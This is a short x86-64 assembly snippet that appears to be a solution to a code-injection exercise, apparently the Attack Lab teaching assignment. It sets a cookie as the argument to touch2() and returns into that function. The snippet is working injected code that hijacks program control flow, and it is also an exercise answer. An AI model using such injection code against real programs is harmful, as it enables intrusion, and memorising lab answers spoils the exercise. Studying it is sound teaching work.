  # injection code
  mov   $0x59b997fa,%rdi  # set cookie as touch2() argument        
  pushq $0x4017ec         # push touch2() address into stack
  ret                     # return to touch2() address from stack
  